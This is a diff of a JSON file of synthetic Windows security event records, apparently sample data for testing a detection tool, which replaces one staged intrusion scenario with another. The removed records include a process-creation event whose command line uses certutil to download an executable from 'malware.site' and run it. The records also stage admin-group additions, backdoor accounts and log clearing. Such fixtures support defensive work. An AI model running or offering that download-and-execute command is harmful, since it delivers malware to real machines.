@@ -1,303 +1,156 @@
 [
   {
-    "RecordId": 2001,
-    "EventId": 4624,
-    "TimeCreated": "2026-02-26T08:15:23.0000000+03:00",
-    "MachineName": "WORKSTATION-01",
-    "LevelDisplayName": "Information",
-    "Message": "An account was successfully logged on.",
-    "EventData": {
-      "TargetUserName": "johndoe",
-      "TargetDomainName": "CONTOSO",
-      "LogonType": "2",
-      "IpAddress": "192.168.1.50",
-      "IpPort": "55321",
-      "LogonProcessName": "User32",
-      "AuthenticationPackageName": "Negotiate"
-    }
-  },
-  {
-    "RecordId": 2002,
+    "RecordId": 1001,
     "EventId": 4625,
-    "TimeCreated": "2026-02-26T08:16:10.0000000+03:00",
+    "TimeCreated": "2026-03-03T10:00:00+00:00",
     "MachineName": "DC01",
-    "LevelDisplayName": "Error",
+    "LevelDisplayName": "Information",
     "Message": "An account failed to log on.",
     "EventData": {
       "TargetUserName": "admin",
-      "TargetDomainName": "CONTOSO",
+      "IpAddress": "10.0.0.50",
       "LogonType": "3",
-      "IpAddress": "103.15.20.10",
-      "IpPort": "58923",
-      "FailureReason": "%%2313",
-      "SubStatus": "0xC000006A"
+      "Status": "0xC000006A"
     }
   },
   {
-    "RecordId": 2003,
+    "RecordId": 1002,
     "EventId": 4625,
-    "TimeCreated": "2026-02-26T08:16:12.0000000+03:00",
+    "TimeCreated": "2026-03-03T10:01:00+00:00",
     "MachineName": "DC01",
-    "LevelDisplayName": "Error",
+    "LevelDisplayName": "Information",
     "Message": "An account failed to log on.",
     "EventData": {
-      "TargetUserName": "Administrator",
-      "TargetDomainName": "CONTOSO",
+      "TargetUserName": "admin",
+      "IpAddress": "10.0.0.50",
       "LogonType": "3",
-      "IpAddress": "103.15.20.10",
-      "IpPort": "58924",
-      "FailureReason": "%%2313",
-      "SubStatus": "0xC000006A"
+      "Status": "0xC000006A"
     }
   },
   {
-    "RecordId": 2004,
+    "RecordId": 1003,
     "EventId": 4625,
-    "TimeCreated": "2026-02-26T08:16:14.0000000+03:00",
+    "TimeCreated": "2026-03-03T10:02:00+00:00",
     "MachineName": "DC01",
-    "LevelDisplayName": "Error",
+    "LevelDisplayName": "Information",
     "Message": "An account failed to log on.",
     "EventData": {
-      "TargetUserName": "krbtgt",
-      "TargetDomainName": "CONTOSO",
+      "TargetUserName": "admin",
+      "IpAddress": "10.0.0.50",
       "LogonType": "3",
-      "IpAddress": "103.15.20.10",
-      "IpPort": "58925",
-      "FailureReason": "%%2313",
-      "SubStatus": "0xC000006A"
+      "Status": "0xC000006A"
     }
   },
   {
-    "RecordId": 2005,
-    "EventId": 4776,
-    "TimeCreated": "2026-02-26T08:16:15.0000000+03:00",
+    "RecordId": 1004,
+    "EventId": 4624,
+    "TimeCreated": "2026-03-03T10:03:00+00:00",
     "MachineName": "DC01",
     "LevelDisplayName": "Information",
-    "Message": "The computer attempted to validate the credentials for an account.",
+    "Message": "An account was successfully logged on.",
     "EventData": {
-      "TargetUserName": "krbtgt",
-      "Workstation": "ATTACKER-PC",
-      "AuthenticationPackageName": "MICROSOFT_AUTHENTICATION_PACKAGE_V1_0",
-      "PreAuthType": "2",
-      "FailureCode": "0xC000006A"
+      "TargetUserName": "admin",
+      "IpAddress": "10.0.0.50",
+      "LogonType": "3"
     }
   },
   {
-    "RecordId": 2006,
-    "EventId": 4768,
-    "TimeCreated": "2026-02-26T08:17:05.0000000+03:00",
-    "MachineName": "DC01",
+    "RecordId": 1005,
+    "EventId": 4624,
+    "TimeCreated": "2026-03-03T12:00:00+00:00",
+    "MachineName": "SRV01",
     "LevelDisplayName": "Information",
-    "Message": "A Kerberos authentication ticket (TGT) was requested.",
+    "Message": "Remote Desktop logon.",
     "EventData": {
-      "ClientName": "MSSQLSERVICE",
-      "ClientRealm": "CONTOSO.COM",
-      "ServiceName": "krbtgt",
-      "PreAuthType": "2",
-      "TicketOptions": "0x40810000",
-      "FailureCode": "0x0",
-      "IpAddress": "192.168.10.20"
+      "TargetUserName": "rdpuser",
+      "IpAddress": "10.0.0.99",
+      "LogonType": "10"
     }
   },
   {
-    "RecordId": 2007,
-    "EventId": 4769,
-    "TimeCreated": "2026-02-26T08:17:06.0000000+03:00",
-    "MachineName": "DC01",
-    "LevelDisplayName": "Information",
-    "Message": "A Kerberos service ticket was requested.",
-    "EventData": {
-      "ClientName": "MSSQLSERVICE",
-      "ServiceName": "CIFS/fileserver",
-      "TicketOptions": "0x40810000",
-      "IpAddress": "192.168.10.20",
-      "Success": "TRUE"
-    }
-  },
-  {
-    "RecordId": 2008,
-    "EventId": 4670,
-    "TimeCreated": "2026-02-26T08:20:10.0000000+03:00",
-    "MachineName": "FILESERVER",
-    "LevelDisplayName": "Information",
-    "Message": "Permissions on an object were changed.",
-    "EventData": {
-      "ObjectName": "C:\\Shared\\Secrets.xlsx",
-      "SubjectUserName": "janitor",
-      "SubjectDomainName": "CONTOSO",
-      "ChangeType": "DACL_MODIFY",
-      "AccessList": "D:PAI(A;OICI;FA;;;BA)(A;OICI;FA;;;SY)"
-    }
-  },
-  {
-    "RecordId": 2009,
-    "EventId": 4720,
-    "TimeCreated": "2026-02-26T08:22:01.0000000+03:00",
-    "MachineName": "DC01",
-    "LevelDisplayName": "Information",
-    "Message": "A user account was created.",
-    "EventData": {
-      "TargetUserName": "backup_adm",
-      "TargetDomainName": "CONTOSO",
-      "SubjectUserName": "IT_SUPPORT",
-      "SubjectDomainName": "CONTOSO",
-      "PrivilegeList": "SeBackupPrivilege"
-    }
-  },
-  {
-    "RecordId": 2010,
+    "RecordId": 1006,
     "EventId": 4728,
-    "TimeCreated": "2026-02-26T08:22:03.0000000+03:00",
+    "TimeCreated": "2026-03-03T11:00:00+00:00",
     "MachineName": "DC01",
     "LevelDisplayName": "Information",
     "Message": "A member was added to a security-enabled global group.",
     "EventData": {
-      "MemberName": "backup_adm",
-      "MemberDomain": "CONTOSO",
-      "TargetGroupName": "Domain Admins",
-      "TargetDomain": "CONTOSO"
+      "SubjectUserName": "administrator",
+      "MemberName": "eviluser",
+      "GroupName": "Domain Admins"
     }
   },
   {
-    "RecordId": 2011,
-    "EventId": 4688,
-    "TimeCreated": "2026-02-26T08:25:30.0000000+03:00",
-    "MachineName": "WORKSTATION-02",
+    "RecordId": 1007,
+    "EventId": 4720,
+    "TimeCreated": "2026-03-03T11:10:00+00:00",
+    "MachineName": "DC01",
     "LevelDisplayName": "Information",
-    "Message": "A new process has been created.",
+    "Message": "A user account was created.",
     "EventData": {
-      "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
-      "CommandLine": "cmd.exe /c certutil.exe -urlcache -split -f http://malware.site/tool.exe C:\\temp\\update.exe && C:\\temp\\update.exe",
-      "CreatorProcessName": "chrome.exe",
-      "TokenElevationType": "%%1936"
+      "SubjectUserName": "administrator",
+      "TargetUserName": "backdoor",
+      "SamAccountName": "backdoor"
     }
   },
   {
-    "RecordId": 2012,
-    "EventId": 4688,
-    "TimeCreated": "2026-02-26T08:25:32.0000000+03:00",
-    "MachineName": "WORKSTATION-02",
+    "RecordId": 1008,
+    "EventId": 4722,
+    "TimeCreated": "2026-03-03T11:12:00+00:00",
+    "MachineName": "DC01",
     "LevelDisplayName": "Information",
-    "Message": "A new process has been created.",
+    "Message": "A user account was enabled.",
     "EventData": {
-      "NewProcessName": "C:\\temp\\update.exe",
-      "ParentProcessName": "cmd.exe",
-      "CommandLine": "C:\\temp\\update.exe --silent"
+      "SubjectUserName": "administrator",
+      "TargetUserName": "backdoor"
     }
   },
   {
-    "RecordId": 2013,
+    "RecordId": 1009,
+    "EventId": 4724,
+    "TimeCreated": "2026-03-03T11:15:00+00:00",
+    "MachineName": "DC01",
+    "LevelDisplayName": "Information",
+    "Message": "An attempt was made to reset an account password.",
+    "EventData": {
+      "SubjectUserName": "administrator",
+      "TargetUserName": "admin"
+    }
+  },
+  {
+    "RecordId": 1010,
+    "EventId": 4719,
+    "TimeCreated": "2026-03-03T11:05:00+00:00",
+    "MachineName": "DC01",
+    "LevelDisplayName": "Warning",
+    "Message": "System audit policy was changed.",
+    "EventData": {
+      "SubjectUserName": "administrator",
+      "CategoryId": "Logon/Logoff"
+    }
+  },
+  {
+    "RecordId": 1011,
+    "EventId": 1102,
+    "TimeCreated": "2026-03-03T11:20:00+00:00",
+    "MachineName": "DC01",
+    "LevelDisplayName": "Information",
+    "Message": "The audit log was cleared.",
+    "EventData": {
+      "SubjectUserName": "administrator"
+    }
+  },
+  {
+    "RecordId": 1012,
     "EventId": 4697,
-    "TimeCreated": "2026-02-26T08:26:10.0000000+03:00",
-    "MachineName": "WORKSTATION-02",
+    "TimeCreated": "2026-03-03T12:10:00+00:00",
+    "MachineName": "SRV01",
     "LevelDisplayName": "Information",
     "Message": "A service was installed in the system.",
     "EventData": {
-      "ServiceName": "WindowsUpdateHelper",
-      "ImagePath": "C:\\Windows\\Temp\\svc_update.exe",
-      "ServiceType": "Win32 Own Process"
-    }
-  },
-  {
-    "RecordId": 2014,
-    "EventId": 4732,
-    "TimeCreated": "2026-02-26T08:28:05.0000000+03:00",
-    "MachineName": "DC01",
-    "LevelDisplayName": "Information",
-    "Message": "A member was added to a security-enabled local group.",
-    "EventData": {
-      "MemberName": "hacker123",
-      "MemberDomain": "CONTOSO",
-      "TargetGroupName": "Administrators",
-      "TargetDomain": "WORKSTATION-03"
-    }
-  },
-  {
-    "RecordId": 2015,
-    "EventId": 4740,
-    "TimeCreated": "2026-02-26T08:30:00.0000000+03:00",
-    "MachineName": "WORKSTATION-01",
-    "LevelDisplayName": "Information",
-    "Message": "A user account was locked out.",
-    "EventData": {
-      "TargetUserName": "johndoe",
-      "SourceModuleName": "Microsoft-Windows-Security-Auditing",
-      "IpAddress": "192.168.1.100",
-      "IpPort": "55432"
-    }
-  },
-  {
-    "RecordId": 2016,
-    "EventId": 4648,
-    "TimeCreated": "2026-02-26T08:31:15.0000000+03:00",
-    "MachineName": "WORKSTATION-04",
-    "LevelDisplayName": "Information",
-    "Message": "A logon was attempted using explicit credentials.",
-    "EventData": {
-      "AccountName": "backup_adm",
-      "AccountDomain": "CONTOSO",
-      "TargetUserName": "Administrator",
-      "TargetDomainName": "WORKSTATION-05",
-      "TargetServerName": "WORKSTATION-05",
-      "LogonCommandline": "runas /user:WORKSTATION-05\\Administrator cmd.exe"
-    }
-  },
-  {
-    "RecordId": 2017,
-    "EventId": 5140,
-    "TimeCreated": "2026-02-26T08:32:10.0000000+03:00",
-    "MachineName": "FILESERVER",
-    "LevelDisplayName": "Information",
-    "Message": "A network share object was accessed.",
-    "EventData": {
-      "ShareName": "\\\\FILESERVER\\IPC$",
-      "RelativeTargetName": "ADMIN$",
-      "SubjectUserName": "MSSQLSERVICE",
-      "IpAddress": "192.168.10.20"
-    }
-  },
-  {
-    "RecordId": 2018,
-    "EventId": 5136,
-    "TimeCreated": "2026-02-26T08:33:01.0000000+03:00",
-    "MachineName": "DC01",
-    "LevelDisplayName": "Information",
-    "Message": "A directory service object was modified.",
-    "EventData": {
-      "ObjectName": "CN=krbtgt,CN=Users,DC=contoso,DC=com",
-      "AttributeLDAPDisplayName": "userAccountControl",
-      "AttributeValue": "0x200",
-      "SubjectUserName": "IT_SUPPORT"
-    }
-  },
-  {
-    "RecordId": 2019,
-    "EventId": 4769,
-    "TimeCreated": "2026-02-26T08:33:02.0000000+03:00",
-    "MachineName": "DC01",
-    "LevelDisplayName": "Information",
-    "Message": "A Kerberos service ticket was requested (with S4U).",
-    "EventData": {
-      "ClientName": "MSSQLSERVICE",
-      "ServiceName": "HOST/WEB01",
-      "TransitedServices": "CIFS/fileserver",
-      "IpAddress": "192.168.10.20",
-      "TicketOptions": "0x40a10000"
-    }
-  },
-  {
-    "RecordId": 2020,
-    "EventId": 4624,
-    "TimeCreated": "2026-02-26T08:35:00.0000000+03:00",
-    "MachineName": "WEB01",
-    "LevelDisplayName": "Information",
-    "Message": "An account was successfully logged on.",
-    "EventData": {
-      "TargetUserName": "IIS APPPOOL\\DefaultAppPool",
-      "LogonType": "8",
-      "LogonProcessName": "Advapi",
-      "AuthenticationPackageName": "NTLM",
-      "IpAddress": "192.168.10.20"
+      "ServiceName": "maliciousService",
+      "ServiceFileName": "C:\\malware.exe",
+      "SubjectUserName": "administrator"
     }
   }
 ]
